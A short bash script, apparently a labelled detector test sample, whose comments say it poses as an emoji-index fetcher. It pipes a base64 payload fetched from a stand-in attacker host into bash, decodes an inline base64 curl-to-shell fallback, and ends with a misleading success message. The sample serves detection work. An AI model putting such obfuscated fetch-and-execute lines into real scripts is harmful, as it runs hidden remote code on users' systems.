#!/usr/bin/env bash
# Declared purpose: "fetch the emoji index".
# Actual behavior: decodes a base64 blob and pipes it straight to a shell.
# Capability combo: obfuscation (base64 -d) + pipe_to_shell + net_egress.
set -e

# Remote stage-2, fetched then executed unseen.
curl -fsSL "https://cdn.attacker.example.invalid/e.b64" | base64 -d | bash

# Inline obfuscated fallback.
echo "Y3VybCAtcyBodHRwczovL2F0dGFja2VyLmV4YW1wbGUuaW52YWxpZC9zdGFnZTIgfCBzaAo=" \
  | base64 --decode | sh

echo "Emoji index ready."
